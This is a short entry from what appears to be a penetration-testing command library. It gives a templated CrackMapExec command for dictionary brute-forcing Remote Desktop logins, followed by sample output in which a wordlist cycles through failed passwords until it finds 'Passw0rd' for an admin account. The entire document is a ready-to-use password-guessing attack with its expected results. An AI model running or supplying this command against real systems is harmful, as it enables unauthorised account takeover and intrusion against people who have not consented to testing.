---
id: 7c80a62a-ff99-4857-9487-19c74b6d40b1
name: CrackMapExec Dictionary Brute Force Remote Desktop Protocol (RDP)
type: command
executor: null
data: crackmapexec rdp $_TARGET_IP -u $_USERLIST -p $_WORDLIST
output: "root@kali:~# crackmapexec rdp 10.10.10.10 -u admin -p wordlist.txt \nCME\
  \          10.10.10.10:445 BOB-PC       [*] Windows 6.1 Build 7601 (name:BOB-PC)\
  \ (domain:BOB-PC)\nCME          10.10.10.10:445 BOB-PC       [-] BOB-PC\\admin:123456\
  \ STATUS_LOGON_FAILURE \nCME          10.10.10.10:445 BOB-PC       [-] BOB-PC\\\
  admin:123456789 STATUS_LOGON_FAILURE \nCME          10.10.10.10:445 BOB-PC     \
  \  [-] BOB-PC\\admin:111111 STATUS_LOGON_FAILURE \n...\n...\nCME          10.10.10.10:445\
  \ BOB-PC       [-] BOB-PC\\admin:loveme STATUS_LOGON_FAILURE \nCME          10.10.10.10:445\
  \ BOB-PC       [-] BOB-PC\\admin:matthew STATUS_LOGON_FAILURE \nCME          10.10.10.10:445\
  \ BOB-PC       [-] BOB-PC\\admin:50cent STATUS_LOGON_FAILURE \nCME          10.10.10.10:445\
  \ BOB-PC       [+] BOB-PC\\admin:Passw0rd \n[*] KTHXBYE!"
created_at: '2019-09-25T02:38:27.488231+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[CrackMapExec]]'
---

# CrackMapExec Dictionary Brute Force Remote Desktop Protocol (RDP)

```bash
crackmapexec rdp $_TARGET_IP -u $_USERLIST -p $_WORDLIST
```

## Expected Output

```
root@kali:~# crackmapexec rdp 10.10.10.10 -u admin -p wordlist.txt 
CME          10.10.10.10:445 BOB-PC       [*] Windows 6.1 Build 7601 (name:BOB-PC) (domain:BOB-PC)
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:123456 STATUS_LOGON_FAILURE 
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:123456789 STATUS_LOGON_FAILURE 
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:111111 STATUS_LOGON_FAILURE 
...
...
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:loveme STATUS_LOGON_FAILURE 
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:matthew STATUS_LOGON_FAILURE 
CME          10.10.10.10:445 BOB-PC       [-] BOB-PC\admin:50cent STATUS_LOGON_FAILURE 
CME          10.10.10.10:445 BOB-PC       [+] BOB-PC\admin:Passw0rd 
[*] KTHXBYE!
```


